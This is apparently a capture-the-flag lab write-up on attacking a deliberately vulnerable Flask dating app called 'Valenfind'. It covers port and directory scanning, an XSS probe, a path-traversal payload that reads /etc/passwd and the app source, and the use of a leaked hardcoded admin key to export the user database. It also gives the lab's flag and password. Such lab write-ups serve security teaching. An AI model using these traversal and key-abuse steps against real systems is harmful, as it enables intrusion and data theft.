# Valenfind
**My Dearest Hacker,**

**There’s this new dating app called “Valenfind” that just popped up out of nowhere. I hear the creator only learned to code this year; surely this must be vibe-coded. Can you exploit it?**
*The part where it says "I hear the creator only learned to code this year; surely this must be vibe-coded" is very intresting,it could be a hint towards cross site scripting or SLQ injection.* 



## reconnaissance

```
gobuster dir -w directory-list-2.3-medium.txt -u http://10.129.165.53:5000/
login, register, logout, dashboard, my_profile
```
```
nmap -sS -sV 10.129.165.53
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.12.3)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
It's a python server!

While creating an account for this website I decided to try adding an alert script in the bio section to check for XSS exploit.
```
<script>alert("helloworld")</script>
```

After creating a account I notcied I can view other peoples profiles. I decided to make another account and click on the account I just made to see if the script worked. The script was sanatized.

*Theres a lot of accounts registered to this site on /dashboard. Cupid stands out the most since its a cupid website plus the bio states "I keep the database secrure. No peeking" So I assume this is where the flag is placed.*

After this reconnaissance I found nothing intresting so i decide to look into inspect element. 

-  Inspect element | N/A
-  Debugger | N/A
-  NETWORK | ```GET http://10.129.165.53:5000/api/fetch_layout?layout=theme_classic.html```

Looks like there's a possible LFI exploit! Let's start digging, in my notes in web hacking we can use ```../../../../etc/passwd``` to find directories!

BINGO!

*root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin sshd:x:109:65534::/run/sshd:/usr/sbin/nologin landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:111:1::/var/cache/pollinate:/bin/false ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false fwupd-refresh:x:113:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin dhcpcd:x:114:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false polkitd:x:997:997:User for polkitd:/:/usr/sbin/nologin*

Might be useful ../../../../etc/issue - Ubuntu 24.04.3 LTS \n \l 

Erorr message exposing the path
```Error loading theme layout: [Errno 2] No such file or directory: '/opt/Valenfind/templates/components/test'```

So since it's a python server we can try and find the script for the server. XXXXXX.py

It could be ValenFind.py Main.py Website.py App.py

App.py works, it contains 

*import os import sqlite3 import hashlib from flask import Flask, render_template, request, redirect, url_for, session, send_file, g, flash, jsonify from seeder import INITIAL_USERS app = Flask(__name__) app.secret_key = os.urandom(24) ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO" DATABASE = 'cupid.db' def get_db(): db = getattr(g, '_database', None) if db is None: db = g._database = sqlite3.connect(DATABASE) db.row_factory = sqlite3.Row return db @app.teardown_appcontext def close_connection(exception): db = getattr(g, '_database', None) if db is not None: db.close() def init_db(): if not os.path.exists(DATABASE): with app.app_context(): db = get_db() cursor = db.cursor() cursor.execute(''' CREATE TABLE users ( id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT NOT NULL UNIQUE, password TEXT NOT NULL, real_name TEXT, email TEXT, phone_number TEXT, address TEXT, bio TEXT, likes INTEGER DEFAULT 0, avatar_image TEXT ) ''') cursor.executemany('INSERT INTO users (username, password, real_name, email, phone_number, address, bio, likes, avatar_image) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)', INITIAL_USERS) db.commit() print("Database initialized successfully.") @app.template_filter('avatar_color') def avatar_color(username): hash_object = hashlib.md5(username.encode()) return '#' + hash_object.hexdigest()[:6] # --- ROUTES --- @app.route('/') def index(): return render_template('index.html') @app.route('/register', methods=['GET', 'POST']) def register(): if request.method == 'POST': username = request.form['username'] password = request.form['password'] db = get_db() try: cursor = db.cursor() cursor.execute('INSERT INTO users (username, password, bio, real_name, email, avatar_image) VALUES (?, ?, ?, ?, ?, ?)', (username, password, "New to ValenFind!", "", "", "default.jpg")) db.commit() user_id = cursor.lastrowid session['user_id'] = user_id session['username'] = username session['liked'] = [] flash("Account created! Please complete your profile.") return redirect(url_for('complete_profile')) except sqlite3.IntegrityError: return render_template('register.html', error="Username already taken.") return render_template('register.html') @app.route('/complete_profile', methods=['GET', 'POST']) def complete_profile(): if 'user_id' not in session: return redirect(url_for('login')) if request.method == 'POST': real_name = request.form['real_name'] email = request.form['email'] phone = request.form['phone'] address = request.form['address'] bio = request.form['bio'] db = get_db() db.execute(''' UPDATE users SET real_name = ?, email = ?, phone_number = ?, address = ?, bio = ? WHERE id = ? ''', (real_name, email, phone, address, bio, session['user_id'])) db.commit() flash("Profile setup complete! Time to find your match.") return redirect(url_for('dashboard')) return render_template('complete_profile.html') @app.route('/my_profile', methods=['GET', 'POST']) def my_profile(): if 'user_id' not in session: return redirect(url_for('login')) db = get_db() if request.method == 'POST': real_name = request.form['real_name'] email = request.form['email'] phone = request.form['phone'] address = request.form['address'] bio = request.form['bio'] db.execute(''' UPDATE users SET real_name = ?, email = ?, phone_number = ?, address = ?, bio = ? WHERE id = ? ''', (real_name, email, phone, address, bio, session['user_id'])) db.commit() flash("Profile updated successfully! ✅") return redirect(url_for('my_profile')) user = db.execute('SELECT * FROM users WHERE id = ?', (session['user_id'],)).fetchone() return render_template('edit_profile.html', user=user) @app.route('/login', methods=['GET', 'POST']) def login(): if request.method == 'POST': username = request.form['username'] password = request.form['password'] db = get_db() user = db.execute('SELECT * FROM users WHERE username = ?', (username,)).fetchone() if user and user['password'] == password: session['user_id'] = user['id'] session['username'] = user['username'] session['liked'] = [] return redirect(url_for('dashboard')) else: return render_template('login.html', error="Invalid credentials.") return render_template('login.html') @app.route('/dashboard') def dashboard(): if 'user_id' not in session: return redirect(url_for('login')) db = get_db() profiles = db.execute('SELECT id, username, likes, bio, avatar_image FROM users WHERE id != ?', (session['user_id'],)).fetchall() return render_template('dashboard.html', profiles=profiles, user=session['username']) @app.route('/profile/') def profile(username): if 'user_id' not in session: return redirect(url_for('login')) db = get_db() profile_user = db.execute('SELECT id, username, bio, likes, avatar_image FROM users WHERE username = ?', (username,)).fetchone() if not profile_user: return "User not found", 404 return render_template('profile.html', profile=profile_user) @app.route('/api/fetch_layout') def fetch_layout(): layout_file = request.args.get('layout', 'theme_classic.html') if 'cupid.db' in layout_file or layout_file.endswith('.db'): return "Security Alert: Database file access is strictly prohibited." if 'seeder.py' in layout_file: return "Security Alert: Configuration file access is strictly prohibited." try: base_dir = os.path.join(os.getcwd(), 'templates', 'components') file_path = os.path.join(base_dir, layout_file) with open(file_path, 'r') as f: return f.read() except Exception as e: return f"Error loading theme layout: {str(e)}" @app.route('/like/', methods=['POST']) def like_user(user_id): if 'user_id' not in session: return redirect(url_for('login')) if 'liked' not in session: session['liked'] = [] if user_id in session['liked']: flash("You already liked this person! Don't be desperate. 😉") return redirect(request.referrer) db = get_db() db.execute('UPDATE users SET likes = likes + 1 WHERE id = ?', (user_id,)) db.commit() session['liked'].append(user_id) session.modified = True flash("You sent a like! ❤️") return redirect(request.referrer) @app.route('/logout') def logout(): session.pop('user_id', None) session.pop('liked', None) return redirect(url_for('index')) @app.route('/api/admin/export_db') def export_db(): auth_header = request.headers.get('X-Valentine-Token') if auth_header == ADMIN_API_KEY: try: return send_file(DATABASE, as_attachment=True, download_name='valenfind_leak.db') except Exception as e: return str(e) else: return jsonify({"error": "Forbidden", "message": "Missing or Invalid Admin Token"}), 403 if __name__ == '__main__': if not os.path.exists('templates/components'): os.makedirs('templates/components') with open('templates/components/theme_classic.html', 'w') as f: f.write('''*


**Important snippets**

``` ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO" ``` 

```if auth_header == ADMIN_API_KEY: try: return send_file(DATABASE, as_attachment=True, download_name='valenfind_leak.db')```

```auth_header = request.headers.get('X-Valentine-Token')``` 

```@app.route('/api/admin/export_db')```

So after checking out ```10.129.165.53:5000/api/admin/export_db```  it gives us a message 
```"Missing or Invalid Admin Token"``` after setting the **X-Valentine-Token** header too **CUPID_MASTER_KEY_2024_XOXO** it downloads a **SQLITE** file containing all the login details for the website. The password to cupid is **admin_root_x99** after logging in and going onto cupids profile we can FINALLY find the flag. **FLAG: THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}**
